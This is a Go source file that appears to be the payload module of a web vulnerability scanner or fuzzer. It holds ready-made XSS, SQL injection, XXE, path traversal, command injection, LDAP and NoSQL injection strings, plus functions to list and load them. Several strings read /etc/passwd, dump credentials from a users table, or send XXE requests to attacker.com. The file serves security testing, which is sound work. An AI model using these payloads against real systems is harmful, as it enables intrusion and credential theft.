package payloads

import (
	"bufio"
	"os"
	"strings"
)

var payloadCategories = map[string][]string{
	"xss": {
		"<script>alert(1)</script>",
		"><img src=x onerror=alert(1)>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"javascript:alert(1)",
		"<iframe src=javascript:alert(1)></iframe>",
		"<body onload=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<select onfocus=alert(1) autofocus>",
		"<textarea onfocus=alert(1) autofocus>",
		"<keygen onfocus=alert(1) autofocus>",
		"<video><source onerror=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<marquee onstart=alert(1)>",
		"<math><mi//xlink:href=\"data:x,<script>alert(1)</script>\">",
		"<table><td background=\"javascript:alert(1)\">",
		"<object data=\"javascript:alert(1)\">",
		"<embed src=\"javascript:alert(1)\">",
	},

	"sqli": {
		"' OR '1'='1",
		"' OR '1'='1' --",
		"' OR 1=1 --",
		"' OR 1=1#",
		"' OR 1=1/*",
		"' OR 'a'='a",
		"' OR '' = '",
		"' OR sleep(5)--",
		"' AND 1=1 --",
		"' AND 1=2 --",
		"' AND sleep(3) --",
		"' UNION SELECT 1,2,3 --",
		"' UNION SELECT null, null, null --",
		"' UNION SELECT username, password FROM users --",
		"admin' or '1'='1",
		"\" OR \"1\"=\"1",
		"') OR ('1'='1",
		"admin')--",
		"\" OR sleep(3) --",
		"\" AND 1=1 --",
		"\" AND 1=2 --",
		"1' AND 1=1 --",
		"1' AND 1=2 --",
		"' OR EXISTS(SELECT * FROM users) --",
		"' AND EXISTS(SELECT * FROM users WHERE username='admin') --",
	},

	"xxe": {
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/hosts\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/version\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://attacker.com/steal\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"ftp://attacker.com/steal\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"gopher://attacker.com/steal\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:file:///etc/passwd\">]><foo>&xxe;</foo>",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>",
	},

	"path_traversal": {
		"../etc/passwd",
		"..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
		"....//....//....//etc/passwd",
		"..%2F..%2F..%2Fetc%2Fpasswd",
		"..%252F..%252F..%252Fetc%252Fpasswd",
		"..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
		"..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
		"/etc/passwd%00",
		"/etc/passwd%00.txt",
		"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd",
		"..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
	},

	"command_injection": {
		"; ls -la",
		"| ls -la",
		"& ls -la",
		"` ls -la `",
		"$( ls -la )",
		"; cat /etc/passwd",
		"| cat /etc/passwd",
		"& cat /etc/passwd",
		"` cat /etc/passwd `",
		"$( cat /etc/passwd )",
		"; whoami",
		"| whoami",
		"& whoami",
		"` whoami `",
		"$( whoami )",
		"; id",
		"| id",
		"& id",
		"` id `",
		"$( id )",
		"; uname -a",
		"| uname -a",
		"& uname -a",
		"` uname -a `",
		"$( uname -a )",
	},

	"ldap": {
		"*",
		"*)(&",
		"*)(|",
		"*)(|(objectClass=*",
		"*)(|(objectClass=user",
		"*)(|(objectClass=group",
		"*)(|(cn=*",
		"*)(|(uid=*",
		"*)(|(mail=*",
		"*)(|(sAMAccountName=*",
		"*)(|(member=*",
		"*)(|(memberOf=*",
		"*)(|(objectCategory=*",
		"*)(|(objectSid=*",
		"*)(|(objectGUID=*",
	},

	"nosql": {
		"{\"$ne\": null}",
		"{\"$ne\": \"\"}",
		"{\"$ne\": 0}",
		"{\"$gt\": \"\"}",
		"{\"$gt\": 0}",
		"{\"$regex\": \".*\"}",
		"{\"$where\": \"this.username == this.password\"}",
		"{\"$where\": \"1==1\"}",
		"{\"$where\": \"true\"}",
		"{\"$where\": \"this.username.length > 0\"}",
		"{\"$or\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
		"{\"$or\": [{\"username\": {\"$regex\": \".*\"}}, {\"password\": {\"$regex\": \".*\"}}]}",
		"{\"$and\": [{\"username\": {\"$ne\": null}}, {\"password\": {\"$ne\": null}}]}",
		"{\"$nor\": [{\"username\": null}, {\"password\": null}]}",
		"{\"$not\": {\"username\": null}}",
	},
}

func GetCategory(name string) []string {
	return payloadCategories[name]
}

func GetAllPayloads() []string {
	var all []string
	for _, payloads := range payloadCategories {
		all = append(all, payloads...)
	}
	return all
}

func GetCategories() []string {
	var categories []string
	for category := range payloadCategories {
		categories = append(categories, category)
	}
	return categories
}

func LoadFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var payloads []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			payloads = append(payloads, line)
		}
	}

	return payloads, scanner.Err()
}
